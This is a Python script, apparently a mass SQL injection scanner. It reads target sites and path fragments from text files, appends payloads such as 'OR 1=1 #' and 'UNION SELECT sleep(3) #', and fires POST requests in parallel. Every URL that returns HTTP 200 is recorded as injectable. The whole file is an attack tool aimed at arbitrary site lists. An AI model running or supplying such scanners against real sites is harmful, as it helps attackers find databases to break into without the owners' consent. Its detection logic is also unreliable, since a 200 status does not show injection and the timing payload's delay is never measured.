from concurrent.futures import ProcessPoolExecutor
from pyfiglet import Figlet
import requests

list_add = ["'",
            "'%20OR%201=1%20#",
            "'%20UNION%20SELECT%20sleep(3)%20#"]

with open('sites.txt', 'r', encoding='utf-8') as f:
    sites = f.read()
SITES = sites.split('\n')


def start_check(site: str):
    with open('checkers_list.txt', 'r', encoding='utf-8') as f:
        strings = f.read()

    list_string = strings.split('\n')
    list_string = set(list_string)
    checkers_list = list(list_string)

    for stroka in checkers_list:
        for i in list_add:
            stroka = stroka.strip()
            url = f"{site}{stroka}1{i}"
            res = requests.post(url).status_code
            if res == 200:
                print(f"\033[32m\033[1m[GOOD]\033[0m SQL-INJECTION IS POSSIBLE \033[1m{url}\033[0m")
                with open('inj_sites.txt', 'a+', encoding='utf-8') as file:
                    file.write(url + '\n')
            else:
                print(f"\033[31m\033[1m[BAD]\033[0m \033[1m{url}\033[0m NOT INJECTION")


def main():
    with ProcessPoolExecutor(max_workers=len(SITES)) as ex:
        ex.map(start_check, SITES)
    return print("\n\033[33m\033[1m[INFO]\033[0m SQL-INJECTIONS URLS WRITTEN TO \033[31m\033[4minj_sites.txt\033[0m")


if __name__ == "__main__":
    preview_text = Figlet(font='doom', width=200)
    text = preview_text.renderText('SQL-Injections Checker')
    print(f'\033[35m\033[1m{text}\033[0m')
    main()
